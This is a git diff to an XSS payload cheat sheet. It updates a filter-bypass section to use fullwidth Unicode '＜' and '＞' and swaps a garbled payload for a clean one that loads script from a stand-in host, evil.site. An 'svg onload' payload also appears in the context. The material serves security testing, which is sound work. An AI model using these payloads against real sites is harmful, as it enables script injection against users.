@@ -45,7 +45,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [Bypass using an alternate way to redirect](#bypass-unsing-an-alternate-way-to-redirect)
   - [Bypass using an alternate way to execute an alert](#bypass-using-an-alternate-way-to-execute-an-alert)
   - [Bypass ">" using nothing](#bypass----using-nothing)
-  - [Bypass "<" using ＜](#bypass----using-＜)
+  - [Bypass "<" and ">" using ＜ and ＞](#bypass----using-＜)
   - [Bypass ";" using another character](#bypass-using------using-another-character)
   - [Bypass using HTML encoding](#bypass-using-html-encoding)
   - [Bypass using Katana](#bypass-using-katana)
@@ -793,10 +793,12 @@ You don't need to close your tags.
 <svg onload=alert(1)//
 ```
 
-### Bypass "<" using ＜
+### Bypass "<" and ">" using ＜ and ＞
+
+Unicode Character U+FF1C and U+FF1E
 
 ```javascript
-[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
+＜script/src=//evil.site/poc.js＞
 ```
 
 ### Bypass ";" using another character
